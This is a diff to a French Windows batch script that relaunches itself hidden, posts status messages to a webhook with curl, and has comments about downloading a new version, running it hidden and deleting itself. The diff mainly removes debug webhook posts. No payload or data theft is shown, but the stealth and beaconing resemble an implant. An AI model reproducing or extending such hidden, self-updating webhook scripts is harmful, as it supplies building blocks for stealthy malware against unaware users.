@@ -1,7 +1,7 @@
 @echo off
 if not "%1"=="hide" start /B cmd /c "%~0" hide & exit
 setlocal enabledelayedexpansion
-::salut
+::salute num 2
 set debutchemin=C:\Users\Aubin\Downloads\
 
 :: 📌 Définition des variables
@@ -99,14 +99,11 @@ if %photo%==false (
 
     :: Supprimer la lettre "T" et extraire la date et l'heure
 
-    set DATE=%RAW_DATE:~0,10%
-    set TIME=%RAW_DATE:~11,5%
+
 
     set RAW_DATE=%RAW_DATE: =%
 
     set nouversion=%RAW_DATE%
-
-    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Bonjour %nouversion%\"}" %WEBHOOK_URL%
 
 
 
@@ -114,24 +111,19 @@ if %photo%==false (
 
 
 
-curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Demarre\"}" %WEBHOOK_URL%
 
-
-
-curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%nouversion% = %version%\"}" %WEBHOOK_URL%
 
 if %nouversion% neq %version% (
     curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Il existe une nouvelle version\"}" %WEBHOOK_URL%
     goto :debutversion
 )
 if %nouversion% == %version% (
-    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"C'est la dernière version\"}" %WEBHOOK_URL%
+    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"C'est la derniere version\"}" %WEBHOOK_URL%
 )
 
 
-::Se programme (dans prog de base) créeer un programme puis le lance en caché et se suppr lui meme
-
 goto :finversion
+
 :debutversion
 
 :: Crée un nouveau fichier batch, paserelle, avec le chemin défini (Doit téléharger nouv version, puis la lancer et se suppr) Tout fait
@@ -160,15 +152,6 @@ del "%chemin_vbs%"
 ::del "%~f0"
 
 :finversion
-
-
-
-
-
-
-
-
-
 
 
 
